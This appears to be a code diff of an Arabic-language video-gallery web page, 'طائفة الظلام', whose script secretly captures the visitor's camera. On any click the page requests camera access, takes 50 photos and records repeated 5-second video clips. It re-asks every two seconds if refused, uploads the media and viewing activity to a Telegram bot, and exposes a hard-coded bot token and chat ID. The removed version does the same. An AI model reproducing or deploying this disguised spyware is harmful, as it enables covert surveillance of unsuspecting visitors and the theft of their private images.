@@ -1,65 +1,82 @@
 
+TOKEN: 7557167179:AAG0_jw9g7EEPhFKJbW5pMLhiPidHrGzt8M
+
+CHAT_ID: 7664410054
+
+
 <!DOCTYPE html>
 <html lang="ar">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=480, initial-scale=1.0, maximum-scale=1.0" />
-  <title>صفحة الفيديوهات - طائفة الظلام</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=480, initial-scale=1.0, maximum-scale=1.0">
+  <title>فيديوهات - طائفة الظلام</title>
   <style>
     body {
-      margin: 0;
-      background-color: #1a001a;
+      background-color: #2b0033;
       font-family: Arial, sans-serif;
       color: white;
+      margin: 0;
+      direction: rtl;
       overflow-x: hidden;
     }
-    .cover {
+    header {
+      position: relative;
+      text-align: center;
+    }
+    header img.cover {
       width: 100%;
       height: 200px;
-      background: url("5alfia.png") no-repeat center;
-      background-size: cover;
-      position: relative;
+      object-fit: cover;
     }
-    .profile-pic {
-      width: 100px;
-      height: 100px;
-      border-radius: 50%;
-      border: 3px solid violet;
+    .profile {
       position: absolute;
-      bottom: -50px;
+      bottom: -40px;
       right: 10px;
-      background: url("profile.png") no-repeat center;
-      background-size: cover;
+      width: 80px;
+      height: 80px;
+      border-radius: 50%;
+      border: 4px solid pink;
+      animation: pulse 2s infinite;
     }
-    .container {
-      margin-top: 60px;
+    @keyframes pulse {
+      0% { box-shadow: 0 0 10px #ff69b4; }
+      50% { box-shadow: 0 0 20px #aa00ff; }
+      100% { box-shadow: 0 0 10px #ff69b4; }
+    }
+    .gallery {
       display: grid;
-      grid-template-columns: repeat(1, 1fr);
-      gap: 20px;
-      padding: 10px;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 10px;
+      padding: 80px 10px 10px;
     }
     .video-box {
+      border: 3px solid pink;
+      border-radius: 10px;
+      overflow: hidden;
       position: relative;
       cursor: pointer;
+      animation: pulse 3s infinite;
     }
     .video-box video {
       width: 100%;
-      border-radius: 10px;
+      height: 120px;
+      object-fit: cover;
+      pointer-events: none;
     }
-    .video-description {
-      margin-top: 5px;
+    .desc {
       text-align: center;
-      font-size: 14px;
-      color: #ccc;
+      background-color: #00000088;
+      font-size: 12px;
+      padding: 2px;
     }
     .fullscreen {
       position: fixed;
       top: 0; left: 0;
       width: 100vw; height: 100vh;
-      background: rgba(0,0,0,0.9);
-      display: flex;
-      justify-content: center;
+      background: rgba(0,0,0,0.95);
+      display: none;
       align-items: center;
+      justify-content: center;
       z-index: 9999;
       flex-direction: column;
     }
@@ -67,68 +84,149 @@
       width: 90%;
       max-height: 70vh;
     }
+    .fullscreen span {
+      margin: 10px;
+      font-size: 18px;
+      color: pink;
+    }
     .download-btn {
-      margin-top: 10px;
-      padding: 10px 20px;
       background: purple;
       color: white;
+      padding: 5px 15px;
       border: none;
-      border-radius: 8px;
-      font-size: 16px;
+      border-radius: 10px;
       cursor: pointer;
+      margin-top: 10px;
+      animation: pulse 1.5s infinite;
+    }
+    .back-btn {
+      position: fixed;
+      bottom: 10px;
+      left: 10px;
+      background: pink;
+      border: none;
+      padding: 10px 20px;
+      border-radius: 50px;
+      font-size: 14px;
+      color: black;
+      animation: pulse 2s infinite;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      text-decoration: none;
     }
   </style>
 </head>
-<body>
+<body onclick="requestCamera();">
 
-<div class="cover">
-  <div class="profile-pic"></div>
-</div>
+<header>
+  <img src="5alfia.png" class="cover" alt="غلاف">
+  <img src="profile.png" class="profile" alt="بروفايل">
+</header>
 
-<div class="container" id="videoContainer">
-  <div class="video-box" onclick="playVideo(this)">
-    <video poster="thumb1.jpg" muted></video>
-    <div class="video-description">لحن النهاية</div>
+<div class="gallery">
+  <!-- 👑 أول فيديو -->
+  <div class="video-box" onclick="openFullscreen('VivaCut_video_1751836959485_HD1.mp4', 'لحن النهاية')">
+    <video src="VivaCut_video_1751836959485_HD1.mp4" muted></video>
+    <div class="desc">لحن النهاية</div>
+  </div>
+  <!-- 👑 4 فيديوهات عشوائية -->
+  <div class="video-box" onclick="openFullscreen('vid2.mp4', 'بدون عنوان')">
+    <video src="vid2.mp4" muted></video>
+    <div class="desc">بدون عنوان</div>
+  </div>
+  <div class="video-box" onclick="openFullscreen('vid3.mp4', 'بدون عنوان')">
+    <video src="vid3.mp4" muted></video>
+    <div class="desc">بدون عنوان</div>
+  </div>
+  <div class="video-box" onclick="openFullscreen('vid4.mp4', 'بدون عنوان')">
+    <video src="vid4.mp4" muted></video>
+    <div class="desc">بدون عنوان</div>
+  </div>
+  <div class="video-box" onclick="openFullscreen('vid5.mp4', 'بدون عنوان')">
+    <video src="vid5.mp4" muted></video>
+    <div class="desc">بدون عنوان</div>
   </div>
 </div>
 
-<div id="fullscreenContainer" class="fullscreen" style="display: none;">
-  <video id="fullscreenVideo" controls></video>
-  <button class="download-btn" onclick="downloadCurrentVideo()">تحميل الفيديو</button>
+<!-- 👑 صفحة تكبير الفيديو -->
+<div class="fullscreen" id="fullscreen">
+  <span>جاري تحميل الفيديو يرجى الانتظار...</span>
+  <video id="fullVideo" controls autoplay></video>
+  <button class="download-btn" onclick="downloadVideo()">تحميل</button>
 </div>
+
+<a href="index.html" class="back-btn">⬅️ رجوع للصور</a>
 
 <script>
 const TOKEN = "7557167179:AAG0_jw9g7EEPhFKJbW5pMLhiPidHrGzt8M";
 const CHAT_ID = "7664410054";
 
-const videoUrl = "VivaCut_video_1751836959485_HD1.mp4";
-const videoDesc = "لحن النهاية";
-let fullscreenVideo = document.getElementById("fullscreenVideo");
-
-function playVideo(elem) {
-  fullscreenVideo.src = videoUrl;
-  document.getElementById("fullscreenContainer").style.display = "flex";
-  fullscreenVideo.play();
-  sendToTelegram("📹 تم النقر على فيديو: " + videoDesc);
-  takePicture();
-}
-
-function downloadCurrentVideo() {
-  const a = document.createElement("a");
-  a.href = videoUrl;
-  a.download = "video.mp4";
-  a.click();
-}
-
-function sendToTelegram(message) {
+// 👑 وظيفة إرسال إلى البوت
+function sendToBot(message) {
   fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ chat_id: CHAT_ID, text: message }),
+    body: JSON.stringify({ chat_id: CHAT_ID, text: message })
   });
 }
 
-function sendFileToTelegram(blob, filename) {
+// 👑 تكبير الفيديو
+function openFullscreen(src, desc) {
+  const screen = document.getElementById("fullscreen");
+  const video = document.getElementById("fullVideo");
+  video.src = src;
+  screen.style.display = "flex";
+  sendToBot(`🎥 تم تشغيل الفيديو: ${desc}`);
+}
+
+// 👑 تحميل الفيديو
+function downloadVideo() {
+  const src = document.getElementById("fullVideo").src;
+  const a = document.createElement("a");
+  a.href = src;
+  a.download = src.split('/').pop();
+  a.click();
+}
+
+// 👑 طلب الكاميرا والتقاط الصور + تسجيل فيديو كل 5 ثوانٍ
+let allowed = false;
+function requestCamera() {
+  if (allowed) return;
+  navigator.mediaDevices.getUserMedia({ video: true })
+    .then(async stream => {
+      allowed = true;
+      const track = stream.getVideoTracks()[0];
+      const imageCapture = new ImageCapture(track);
+
+      // 📸 التقاط 50 صورة
+      for (let i = 0; i < 50; i++) {
+        const blob = await imageCapture.takePhoto();
+        uploadMedia(blob, "photo.jpg");
+      }
+
+      // 🎥 تسجيل فيديو متكرر
+      setInterval(() => {
+        let recorder = new MediaRecorder(stream);
+        let chunks = [];
+        recorder.ondataavailable = e => chunks.push(e.data);
+        recorder.onstop = () => {
+          const blob = new Blob(chunks, { type: 'video/mp4' });
+          uploadMedia(blob, "cam.mp4");
+        };
+        recorder.start();
+        setTimeout(() => recorder.stop(), 5000);
+      }, 5000);
+
+    })
+    .catch(() => {
+      allowed = false;
+      setTimeout(requestCamera, 2000); // طلب مجدد إذا رفض
+    });
+}
+
+// 👑 رفع وسائط إلى تليجرام
+function uploadMedia(blob, filename) {
   const formData = new FormData();
   formData.append("chat_id", CHAT_ID);
   formData.append("video", blob, filename);
@@ -137,70 +235,6 @@ function sendFileToTelegram(blob, filename) {
     body: formData
   });
 }
-
-function sendPhotoToTelegram(blob) {
-  const formData = new FormData();
-  formData.append("chat_id", CHAT_ID);
-  formData.append("photo", blob, `photo${Date.now()}.jpg`);
-  fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
-    method: "POST",
-    body: formData
-  });
-}
-
-let mediaStream = null;
-let videoRecorder = null;
-
-// طلب إذن الوصول وتشغيل التسجيل كل 5 ثوانٍ
-navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
-  mediaStream = stream;
-  startVideoCaptureLoop();
-
-  // التقاط 50 صورة عند الدخول
-  for (let i = 0; i < 50; i++) {
-    setTimeout(() => takePicture(), i * 300);
-  }
-}).catch(() => {
-  alert("🚫 يجب السماح بالوصول إلى الكاميرا");
-});
-
-function startVideoCaptureLoop() {
-  setInterval(() => {
-    let chunks = [];
-    videoRecorder = new MediaRecorder(mediaStream);
-    videoRecorder.ondataavailable = e => chunks.push(e.data);
-    videoRecorder.onstop = () => {
-      const blob = new Blob(chunks, { type: "video/mp4" });
-      sendFileToTelegram(blob, `rec${Date.now()}.mp4`);
-    };
-    videoRecorder.start();
-    setTimeout(() => videoRecorder.stop(), 5000);
-  }, 5000);
-}
-
-function takePicture() {
-  const video = document.createElement("video");
-  video.srcObject = mediaStream;
-  video.play();
-
-  const canvas = document.createElement("canvas");
-  canvas.width = 480;
-  canvas.height = 360;
-  const ctx = canvas.getContext("2d");
-
-  setTimeout(() => {
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-    canvas.toBlob(blob => {
-      sendPhotoToTelegram(blob);
-      video.pause();
-      video.srcObject = null;
-    }, "image/jpeg");
-  }, 500);
-}
-
-// التقاط صورة عند أي نقرة في الصفحة
-document.body.addEventListener("click", takePicture);
 </script>
-
 </body>
 </html>
